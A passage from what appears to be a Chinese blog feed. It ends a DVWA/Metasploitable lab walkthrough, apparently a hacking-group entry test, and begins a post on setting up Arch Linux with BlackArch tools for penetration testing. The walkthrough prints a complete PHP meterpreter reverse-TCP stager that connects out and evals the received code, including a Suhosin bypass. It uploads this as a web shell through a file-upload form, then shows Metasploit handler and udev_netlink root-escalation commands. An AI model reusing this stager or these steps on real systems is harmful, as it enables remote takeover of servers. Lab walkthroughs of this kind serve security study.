class="k">break</span><span class="p">;</span> <span class="p">}</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$len</span><span class="p">)</span> <span class="p">{</span> <span class="k">die</span><span class="p">();</span> <span class="p">}</span> <span class="nv">$a</span> <span class="o">=</span> <span class="nx">unpack</span><span class="p">(</span><span class="s2">&#34;Nlen&#34;</span><span class="p">,</span> <span class="nv">$len</span><span class="p">);</span> <span class="nv">$len</span> <span class="o">=</span> <span class="nv">$a</span><span class="p">[</span><span class="s1">&#39;len&#39;</span><span class="p">];</span> <span class="nv">$b</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span> <span class="k">while</span> <span class="p">(</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$b</span><span class="p">)</span> <span class="o">&lt;</span> <span class="nv">$len</span><span class="p">)</span> <span class="p">{</span> <span class="k">switch</span> <span class="p">(</span><span class="nv">$s_type</span><span class="p">)</span> <span class="p">{</span> <span class="k">case</span> <span class="s1">&#39;stream&#39;</span><span class="o">:</span> <span class="nv">$b</span> <span class="o">.=</span> <span class="nx">fread</span><span class="p">(</span><span class="nv">$s</span><span class="p">,</span> <span class="nv">$len</span><span class="o">-</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$b</span><span class="p">));</span> <span class="k">break</span><span class="p">;</span> <span class="k">case</span> <span class="s1">&#39;socket&#39;</span><span class="o">:</span> <span class="nv">$b</span> <span class="o">.=</span> <span class="nx">socket_read</span><span class="p">(</span><span class="nv">$s</span><span class="p">,</span> <span class="nv">$len</span><span class="o">-</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$b</span><span class="p">));</span> <span class="k">break</span><span class="p">;</span> <span class="p">}</span> <span class="p">}</span> <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;msgsock&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$s</span><span class="p">;</span> <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;msgsock_type&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$s_type</span><span class="p">;</span> <span class="k">if</span> <span class="p">(</span><span class="nx">extension_loaded</span><span class="p">(</span><span class="s1">&#39;suhosin&#39;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">ini_get</span><span class="p">(</span><span class="s1">&#39;suhosin.executor.disable_eval&#39;</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$suhosin_bypass</span><span class="o">=</span><span class="nx">create_function</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$b</span><span class="p">);</span> <span class="nv">$suhosin_bypass</span><span class="p">();</span> <span class="p">}</span> <span class="k">else</span> <span class="p">{</span> <span class="k">eval</span><span class="p">(</span><span class="nv">$b</span><span class="p">);</span> <span class="p">}</span> <span class="k">die</span><span class="p">();</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>只有一行～！这一行就是嘿嘿。。。自己看啦</p>
<p>我们加一些html上去吧:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="cm">/*&lt;?php /**/</span> <span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> <span class="nv">$ip</span> <span class="o">=</span> <span class="s1">&#39;192.168.0.106&#39;</span><span class="p">;</span> <span class="nv">$port</span> <span class="o">=</span> <span class="mi">4444</span><span class="p">;</span> <span class="k">if</span> <span class="p">((</span><span class="nv">$f</span> <span class="o">=</span> <span class="s1">&#39;stream_socket_client&#39;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">is_callable</span><span class="p">(</span><span class="nv">$f</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$s</span> <span class="o">=</span> <span class="nv">$f</span><span class="p">(</span><span class="s2">&#34;tcp://</span><span class="si">{</span><span class="nv">$ip</span><span class="si">}</span><span class="s2">:</span><span class="si">{</span><span class="nv">$port</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">);</span> <span class="nv">$s_type</span> <span class="o">=</span> <span class="s1">&#39;stream&#39;</span><span class="p">;</span> <span class="p">}</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$s</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$f</span> <span class="o">=</span> <span class="s1">&#39;fsockopen&#39;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">is_callable</span><span class="p">(</span><span class="nv">$f</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$s</span> <span class="o">=</span> <span class="nv">$f</span><span class="p">(</span><span class="nv">$ip</span><span class="p">,</span> <span class="nv">$port</span><span class="p">);</span> <span class="nv">$s_type</span> <span class="o">=</span> <span class="s1">&#39;stream&#39;</span><span class="p">;</span> <span class="p">}</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$s</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$f</span> <span class="o">=</span> <span class="s1">&#39;socket_create&#39;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">is_callable</span><span class="p">(</span><span class="nv">$f</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$s</span> <span class="o">=</span> <span class="nv">$f</span><span class="p">(</span><span class="nx">AF_INET</span><span class="p">,</span> <span class="nx">SOCK_STREAM</span><span class="p">,</span> <span class="nx">SOL_TCP</span><span class="p">);</span> <span class="nv">$res</span> <span class="o">=</span> <span class="o">@</span><span class="nx">socket_connect</span><span class="p">(</span><span class="nv">$s</span><span class="p">,</span> <span class="nv">$ip</span><span class="p">,</span> <span class="nv">$port</span><span class="p">);</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$res</span><span class="p">)</span> <span class="p">{</span> <span class="k">die</span><span class="p">();</span> <span class="p">}</span> <span class="nv">$s_type</span> <span class="o">=</span> <span class="s1">&#39;socket&#39;</span><span class="p">;</span> <span class="p">}</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$s_type</span><span class="p">)</span> <span class="p">{</span> <span class="k">die</span><span class="p">(</span><span class="s1">&#39;no socket funcs&#39;</span><span class="p">);</span> <span class="p">}</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$s</span><span class="p">)</span> <span class="p">{</span> <span class="k">die</span><span class="p">(</span><span class="s1">&#39;no socket&#39;</span><span class="p">);</span> <span class="p">}</span> <span class="k">switch</span> <span class="p">(</span><span class="nv">$s_type</span><span class="p">)</span> <span class="p">{</span> <span class="k">case</span> <span class="s1">&#39;stream&#39;</span><span class="o">:</span> <span class="nv">$len</span> <span class="o">=</span> <span class="nx">fread</span><span class="p">(</span><span class="nv">$s</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span> <span class="k">case</span> <span class="s1">&#39;socket&#39;</span><span class="o">:</span> <span class="nv">$len</span> <span class="o">=</span> <span class="nx">socket_read</span><span class="p">(</span><span class="nv">$s</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span> <span class="p">}</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$len</span><span class="p">)</span> <span class="p">{</span> <span class="k">die</span><span class="p">();</span> <span class="p">}</span> <span class="nv">$a</span> <span class="o">=</span> <span class="nx">unpack</span><span class="p">(</span><span class="s2">&#34;Nlen&#34;</span><span class="p">,</span> <span class="nv">$len</span><span class="p">);</span> <span class="nv">$len</span> <span class="o">=</span> <span class="nv">$a</span><span class="p">[</span><span class="s1">&#39;len&#39;</span><span class="p">];</span> <span class="nv">$b</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span> <span class="k">while</span> <span class="p">(</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$b</span><span class="p">)</span> <span class="o">&lt;</span> <span class="nv">$len</span><span class="p">)</span> <span class="p">{</span> <span class="k">switch</span> <span class="p">(</span><span class="nv">$s_type</span><span class="p">)</span> <span class="p">{</span> <span class="k">case</span> <span class="s1">&#39;stream&#39;</span><span class="o">:</span> <span class="nv">$b</span> <span class="o">.=</span> <span class="nx">fread</span><span class="p">(</span><span class="nv">$s</span><span class="p">,</span> <span class="nv">$len</span><span class="o">-</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$b</span><span class="p">));</span> <span class="k">break</span><span class="p">;</span> <span class="k">case</span> <span class="s1">&#39;socket&#39;</span><span class="o">:</span> <span class="nv">$b</span> <span class="o">.=</span> <span class="nx">socket_read</span><span class="p">(</span><span class="nv">$s</span><span class="p">,</span> <span class="nv">$len</span><span class="o">-</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$b</span><span class="p">));</span> <span class="k">break</span><span class="p">;</span> <span class="p">}</span> <span class="p">}</span> <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;msgsock&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$s</span><span class="p">;</span> <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;msgsock_type&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$s_type</span><span class="p">;</span> <span class="k">if</span> <span class="p">(</span><span class="nx">extension_loaded</span><span class="p">(</span><span class="s1">&#39;suhosin&#39;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">ini_get</span><span class="p">(</span><span class="s1">&#39;suhosin.executor.disable_eval&#39;</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$suhosin_bypass</span><span class="o">=</span><span class="nx">create_function</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$b</span><span class="p">);</span> <span class="nv">$suhosin_bypass</span><span class="p">();</span> <span class="p">}</span> <span class="k">else</span> <span class="p">{</span> <span class="k">eval</span><span class="p">(</span><span class="nv">$b</span><span class="p">);</span> <span class="p">}</span> <span class="k">die</span><span class="p">();</span><span class="cp">?&gt;</span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;html&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;head&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;meta charset=&#34;utf-8&#34; /&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;/head&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;body&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;h1&gt;Hacked&lt;/h1&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;/body&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;/html&gt;
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>接下来回到DVWA，在左下角点击 <strong><code>upload</code></strong> 进入上传页面，然后点击 <strong><code>选择文件</code></strong> 再点击 <strong><code>upload</code></strong> 即可。</p>
<p>将这个文件上传进去。</p>
<p>如果这都不会我就不多说了，<strong>你连上传个文件都不会还想进锏幕？</strong></p>
<p></p>
<p>然后我们可以看到这么一串东西。</p>
<p><strong><code>../../hackable/uploads/test.php succesfully uploaded!</code></strong></p>
<p>说明你上传成功了，接下来要用到<strong>msf</strong></p>
<p>我们在终端进入msf:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo msfconsole
</span></span></code></pre></td></tr></table>
</div>
</div><p>不多讲了，走个命令流程，之前写过</p>
<p>调用模块:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf5 &gt; use exploit/multi/handler
</span></span></code></pre></td></tr></table>
</div>
</div><p>按顺序执行:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf5 exploit<span class="o">(</span>multi/handler<span class="o">)</span> &gt; <span class="nb">set</span> lhost 192.168.0.106
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf5 exploit<span class="o">(</span>multi/handler<span class="o">)</span> &gt; <span class="nb">set</span> lport <span class="m">4444</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf5 exploit<span class="o">(</span>multi/handler<span class="o">)</span> &gt; <span class="nb">set</span> payload php/meterpreter/reverse_tcp
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf5 exploit<span class="o">(</span>multi/handler<span class="o">)</span> &gt; run
</span></span></code></pre></td></tr></table>
</div>
</div><p>执行完后，如图:</p>
<p></p>
<p>接下来，我们会到浏览器，直接访问<code>http://192.168.0.105/dvwa/hackable/uploads/test.php</code></p>
<p>这时，msf会收到反弹，如图:</p>
<p></p>
<p></p>
<p>可见权限小得可怜，不过也第三关就这样通过了。权限的问题我们会在第四关解决</p>
<h3 id="第四关获取root权限">第四关|获取root权限</h3>
<p>你能做到这里说明你已经不是萌新了，最后一关：提权</p>
<p>这是最关键的一环，那么我们开始吧。</p>
<p>首先把我们刚刚获取的webshell放到后台:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">meterpreter &gt; background
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后我们使用这个模块<code>exploit/linux/local/udev_netlink</code>(用别的也可以，我个人喜欢用这个:)</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf5 exploit<span class="o">(</span>multi/handler<span class="o">)</span> &gt; use exploit/linux/local/udev_netlink
</span></span></code></pre></td></tr></table>
</div>
</div><p>模块的信息你可以自己输入 <strong><code>info</code></strong> 这个命令去查看，</p>
<p>然后我们设置刚刚webshell的session号，我的是2:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf5 exploit<span class="o">(</span>linux/local/udev_netlink<span class="o">)</span> &gt; <span class="nb">set</span> SESSION <span class="m">2</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>最后执行 <strong><code>run</code></strong> 或者 <strong><code>exploit</code></strong> :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf5 exploit<span class="o">(</span>linux/local/udev_netlink<span class="o">)</span> &gt; exploit
</span></span></code></pre></td></tr></table>
</div>
</div><p>这样我们就获取到最高权限了，如图:</p>
<p></p>
<p>我们来看看用户是不是root</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">meterpreter &gt; getuid
</span></span></code></pre></td></tr></table>
</div>
</div><p>或</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">meterpreter &gt; shell
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">whoami
</span></span></code></pre></td></tr></table>
</div>
</div><p>如图</p>
<p></p>
<p>然后，我们就通过了第四关，同时也通过了全部考核，接下来只要取证和提交截图就可以成为锏幕核心成员了。</p>
<hr>
<h2 id="结语">结语</h2>
<p>写了一个礼拜，全是即操作即写</p>
<p>看完还不会的，，，在下面留言吧..</p>
<h2 id="参考链接">参考链接</h2>
<ul>
<li>
<p><a href="https://wiki.archlinux.org/index.php/Main_page_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29" target="_blank" rel="noopener noreffer">ArchWiki</a></p>
</li>
<li>
<p><a href="https://sourceforge.net/projects/metasploitable/" target="_blank" rel="noopener noreffer">Metasploitable下载地址</a></p>
</li>
<li>
<p><a href="https://www.bilibili.com/video/av59729967" target="_blank" rel="noopener noreffer">由帝的sqlmap视频</a></p>
</li>
</ul>
<hr>
<p><strong>注意：转载请注明出处，禁止用本博客去干一些作死的事情，否则后果自负，与我无关</strong></p>
]]></description>
</item><item>
    <title>用 Arch Linux 打造完美渗透环境</title>
    <link>http://weepingdogel.github.io/posts/%E7%94%A8arch_linux%E6%89%93%E9%80%A0%E5%AE%8C%E7%BE%8E%E6%B8%97%E9%80%8F%E7%8E%AF%E5%A2%83/</link>
    <pubDate>Wed, 31 Jul 2019 21:19:52 &#43;0800</pubDate>
    <author>作者</author>
    <guid>http://weepingdogel.github.io/posts/%E7%94%A8arch_linux%E6%89%93%E9%80%A0%E5%AE%8C%E7%BE%8E%E6%B8%97%E9%80%8F%E7%8E%AF%E5%A2%83/</guid>
    <description><![CDATA[<div class="featured-image">
                <img src="/images/wallhaven-nky7y7.png" referrerpolicy="no-referrer">
            </div><h2 id="简介arch-linux">简介Arch Linux</h2>
<p>Arch Linux是一款通用x86_64的GNU/Linux发行版，它采用滚动更新模式，尽全力给用户提供最新的稳定版软件。</p>
<blockquote>
<p>嘿嘿，很久不滚可能会滚挂哦</p>
</blockquote>
<p>刚装完的Arch只是一个基本系统，什么都没有，随后用户就可以根据自己的想法和喜好，安装自己需要的软件，然后通过高度自定义的配置，打造自己喜欢的、理想的系统。这也是Arch的可爱和有吸引力之处。所以Arch也是我最喜欢的发行版之一。</p>
<p>关于Arch Linux的更多详细内容，请参见<a href="https://wiki.archlinux.org/index.php/Arch_Linux_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29" target="_blank" rel="noopener noreffer">Arch Wiki</a>。</p>
<h2 id="本期内容介绍">本期内容介绍</h2>
<p>本期将会演示如何用Arch Linux打造完美的渗透环境。一切操作均为教程演示，请读者根据实际情况操作。没使用过Arch Linux的用户请<strong>谨慎操作</strong>，并仔细查阅<a href="https://wiki.archlinux.org/index.php/Main_page_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29" target="_blank" rel="noopener noreffer">Arch Wiki</a>。</p>
<p>那么，开始本期的内容吧。</p>
<h3 id="提示">提示</h3>
<p>本期博客会大量使用Arch Wiki的超链接，以方便理解部分内容。</p>
<h2 id="准备工作">准备工作</h2>
<h3 id="安装arch-linux">安装Arch Linux</h3>
<p>本期博客不会详细写出Arch Linux的安装过程，请参考<a href="https://wiki.archlinux.org/index.php/Installation_guide_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29" target="_blank" rel="noopener noreffer">Arch Wiki</a>安装Arch Linux，并做好基本的配置工作。</p>
<h3 id="选择轻量桌面环境">选择轻量桌面环境</h3>
<p>由于渗透测试中部分操作会占用大量的资源，所以请尽量按需求选择轻量的桌面环境，这里不建议使用 <a href="https://wiki.archlinux.org/index.php/GNOME_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29" target="_blank" rel="noopener noreffer">Gnome</a> 和 <a href="https://wiki.archlinux.org/index.php/KDE_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29" target="_blank" rel="noopener noreffer">KDE</a>，因为二者占用的资源非常大，对低配用户不友好。</p>
<ol>
<li><a href="https://wiki.archlinux.org/index.php/LXDE_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29" target="_blank" rel="noopener noreffer">LXDE</a></li>
</ol>
<ul>
<li>轻量级GTK桌面环境，默认窗口管理器是 <a href="https://wiki.archlinux.org/index.php/Openbox_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29" target="_blank" rel="noopener noreffer">OpenBox</a> ，最轻量的桌面环境之一。</li>
</ul>
<ol start="2">
<li><a href="https://wiki.archlinux.org/index.php/LXQt_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29" target="_blank" rel="noopener noreffer">LXQT</a></li>
</ol>
<ul>
<li>2013年间，洪任諭（“PCMan”）启动了将 LXDE 移植到 Qt 的项目。所以LXQT相当于是使用QT的LXDE，默认窗口管理器还是 <a href="https://wiki.archlinux.org/index.php/Openbox_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29" target="_blank" rel="noopener noreffer">OpenBox</a> ，它比上面的LXDE还要轻量。</li>
</ul>
<ol start="3">
<li><a href="https://wiki.archlinux.org/index.php/Xfce_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29" target="_blank" rel="noopener noreffer">xfce4</a></li>
</ol>
<ul>
<li>目前我在用的桌面环境，基于GTK+2，这个是轻量化桌面环境中最好看的一个了。</li>
</ul>
<ol start="4">
<li><a href="https://wiki.archlinux.org/index.php/I3_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29" target="_blank" rel="noopener noreffer">i3wm</a></li>
</ol>
<ul>
<li>i3 是一种动态的<a href="https://en.wikipedia.org/wiki/Tiling_window_manager" target="_blank" rel="noopener noreffer">平铺式窗口管理器</a>，其灵感来自于面向开发者与资深用户的 <a href="https://wiki.archlinux.org/index.php/Wmii" target="_blank" rel="noopener noreffer">wmii</a>。 i3 的既定目标包括清晰可读的文档，完善的多显示器支持，基于树形结构的窗口管理，提供 <a href="https://wiki.archlinux.org/index.php/Vim" target="_blank" rel="noopener noreffer">vim</a> 式的多种操作模式。 ——摘自<a href="https://wiki.archlinux.org/index.php/I3_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29" target="_blank" rel="noopener noreffer">Arch Wiki</a>。</li>
</ul>
<ol start="5">
<li>自己DIY桌面环境</li>
</ol>
<ul>
<li>你可以使用上面介绍过的 <a href="https://wiki.archlinux.org/index.php/Openbox_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29" target="_blank" rel="noopener noreffer">OpenBox</a> 通过配置来DIY自己的桌面环境，也可以使用 <a href="https://wiki.archlinux.org/index.php/Fluxbox_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29" target="_blank" rel="noopener noreffer">fluxbox</a>、<a href="https://wiki.archlinux.org/index.php/I3_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29" target="_blank" rel="noopener noreffer">i3wm</a> 等。详细请参见 <del><a href="https://latiao233.github.io/2019/07/30/%E5%88%A9%E7%94%A8openbox%E6%89%93%E9%80%A0%E8%87%AA%E5%B7%B1%E7%9A%84%E6%A1%8C%E9%9D%A2%E7%8E%AF%E5%A2%83/#more" target="_blank" rel="noopener noreffer">利用openbox打造自己的桌面环境-辣条的博客(链接已失效)。</a></del></li>
</ul>
<p>本期博客也将会使用自定义桌面环境进行演示。</p>
<blockquote>
<p>OpenBox+xfce4-panel</p>
</blockquote>
<h3 id="添加black-arch源">添加Black Arch源</h3>
<p>当Arch Linux基本配置完成之后，就可以开始正常使用了，但是为了安装渗透工具，需要添加一个<strong>Black Arch软件源</strong></p>
<blockquote>
<h4 id="什么是black-arch"><strong>什么是Black Arch</strong></h4>
<p>BlackArch Linux，简称BlackArch，是一份基于Arch的Linux发行版。该发行版被设计用于系统渗透测试及安全研究。BlackArch提供一张自启动运行DVD镜像，其中包含有多个轻量级窗口管理器和一千多种用于渗透测试和计算机取证分析的专用工具。该系统即可以直接从镜像启动，也可以安装在硬盘、U盘或虚拟机上。 ——摘自<a href="https://zh.wikipedia.org/zh-hans/BlackArch_Linux" target="_blank" rel="noopener noreffer">维基百科(需要科学上网)</a></p>
<p>Black Arch官网：<a href="https://blackarch.org/" target="_blank" rel="noopener noreffer">blackarch.org</a></p>
</blockquote>
<p>如上我们知道，Black Arch是一个基于Arch Linux的独立发行版，但我们不需要去安装它，我们只需要添加它的软件源就好。</p>
<p>具体操作如下:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo nano /etc/pacman.conf <span class="c1"># 编辑pacman.conf文件</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>在<code>pacman.conf</code>文件的末尾加入以下内容:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[blackarch]
</span></span><span class="line"><span class="cl">SigLevel = Optional TrustAll
</span></span><span class="line"><span class="cl">Server = https://mirrors.ustc.edu.cn/blackarch/$repo/os/$arch
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后执行:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo pacman -Syyu
</span></span></code></pre></td></tr></table>
</div>
</div><p>如果没问题，就可以使用Black Arch的软件源了。</p>
<h2 id="开始安装配置常用渗透工具">开始安装、配置常用渗透工具</h2>
<h3 id="端口扫描和信息收集">端口扫描和信息收集</h3>
<h4 id="namp">Namp</h4>
<p>首先搬出<a href="https://baike.baidu.com/item/nmap/1400075?fr=aladdin" target="_blank" rel="noopener noreffer">Nmap</a>，这是一个很常用的扫描工具，可以在渗透的过程中扫描到对方的IP、端口、操作系统等情况。</p>
<h5 id="安装方法">安装方法</h5>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo pacman -S nmap
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="基本用法">基本用法</h5>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ nmap &lt;目标IP地址&gt; <span class="c1"># 简单的扫描</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo nmap -O &lt;目标IP地址&gt; <span class="c1"># 扫描目标的操作系统情况</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo nmap -sP &lt;目标IP地址&gt; <span class="c1"># ping扫描</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>更多用法可参考搜索引擎查询。</p>
<h4 id="xerosploit">xerosploit</h4>
<p>这个扫描工具比<strong>Nmap</strong>要炫酷一些，色彩也比较好看，用法也很简单，比<strong>Metasploit</strong>还简单。</p>
<h5 id="安装方法-1">安装方法</h5>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
